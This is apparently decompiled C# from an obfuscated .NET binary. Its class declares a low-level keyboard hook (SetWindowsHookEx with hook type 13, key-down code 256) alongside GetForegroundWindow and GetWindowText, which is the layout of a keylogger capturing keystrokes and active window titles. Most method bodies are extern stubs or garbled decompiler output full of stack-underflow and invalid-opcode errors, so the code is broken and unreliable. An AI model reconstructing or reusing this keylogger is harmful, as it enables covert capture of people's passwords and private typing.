using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class GClass1
{
	public delegate IntPtr GDelegate0(int nCode, IntPtr wParam, IntPtr lParam);

	private const int int_0 = 13;

	private const int int_1 = 256;

	private static readonly GDelegate0 gdelegate0_0;

	private static IntPtr intptr_0;

	private static string string_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static bool bool_0;

	public static extern bool Boolean_0
	{
		[CompilerGenerated]
		private get;
		[CompilerGenerated]
		set;
	}

	public extern void method_0();

	public extern IntPtr method_1(GDelegate0 gdelegate0_1);

	public static extern IntPtr smethod_0(int int_2, IntPtr intptr_1, IntPtr intptr_2);

	public unsafe static string smethod_1()
	{
		while (/*Error near IL_0006: Stack underflow*/ <= /*Error near IL_0006: Stack underflow*/)
		{
		}
		*(_003F*)(nint)/*Error near IL_0007: Stack underflow*/ = /*Error near IL_0007: Stack underflow*/;
		return (string)/*OpCode not supported: Nop*/;
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr intptr_1, StringBuilder stringBuilder_0, int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr SetWindowsHookEx(int int_2, GDelegate0 gdelegate0_1, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_2, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle(string string_1);

	public extern GClass1();

	unsafe static ApplicationContext smethod_2()
	{
		//Discarded unreachable code: IL_0026, IL_002c, IL_0031
		//IL_0005: Expected F8, but got I4
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Invalid comparison between Unknown and F8
		//IL_0018: Incompatible stack heights: 0 vs 1
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected I4, but got Unknown
		while (true)
		{
			((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (sbyte)/*Error near IL_0001: Stack underflow*/;
			_003F val = /*Error near IL_0002: ldarg 3 (out-of-bounds)*/;
			uint num = ((uint[])/*Error near IL_0004: Stack underflow*/)[val];
			*(double*)(nint)/*Error near IL_0005: Stack underflow*/ = (int)num;
			/*OpCode not supported: Ckfinite*/;
			*(_003F*)(nint)/*Error near IL_0007: Stack underflow*/ = /*Error near IL_0007: Stack underflow*/;
			_003F val2 = checked(/*Error near IL_0008: Stack underflow*/ + /*Error near IL_0008: Stack underflow*/);
			double num2 = ((double[])/*Error near IL_0009: Stack underflow*/)[val2];
			if (!((double)/*Error near IL_000e: Stack underflow*/ > num2))
			{
				((short[])/*Error near IL_0010: Stack underflow*/)[/*Error near IL_0010: Stack underflow*/] = (short)/*Error near IL_0010: Stack underflow*/;
				_ = (int)(*(ushort*)(nint)/*Error near IL_0011: Stack underflow*/);
				if (5L == 0L)
				{
					_003F val3 = ~/*Error near IL_001e: Stack underflow*/;
					((int[])/*Error near IL_001f: Stack underflow*/)[/*Error near IL_001f: Stack underflow*/] = (int)val3;
					*(_003F*)(nint)/*Error near IL_0020: Stack underflow*/ = /*Error near IL_0020: Stack underflow*/;
				}
			}
		}
	}

	static extern void smethod_3(ApplicationContext applicationContext_0);

	static extern Process smethod_4();

	static extern ProcessModule smethod_5(Process process_0);

	static extern string smethod_6(ProcessModule processModule_0);

	static extern void smethod_7(IDisposable idisposable_0);

	static extern int smethod_8(IntPtr intptr_1);

	unsafe static Encoding smethod_9()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I
		while (true)
		{
			_003F val = checked(/*Error near IL_0001: Stack underflow*/ * /*Error near IL_0001: Stack underflow*/);
			long num = ((long[])/*Error near IL_0002: Stack underflow*/)[val];
			((long[])/*Error near IL_0003: Stack underflow*/)[/*Error near IL_0003: Stack underflow*/] = num;
			if (checked((uint)/*Error near IL_0004: Stack underflow*/) != 0)
			{
				IntPtr intPtr = *(IntPtr*)(nint)/*Error near IL_000b: Stack underflow*/;
				if ((nint)/*Error near IL_0010: Stack underflow*/ <= (nint)intPtr)
				{
					/*Error: Could not find block for branch target IL_0010*/;
				}
			}
		}
	}

	static byte[] smethod_10(Encoding encoding_0, string string_1)
	{
		//Discarded unreachable code: IL_0006, IL_0014, IL_001a
		//IL_0006: Unsupported input type for neg.
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		/*Error: ldloc 3 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	static extern StringBuilder smethod_11(int int_2);

	static extern string smethod_12(object object_0);
}
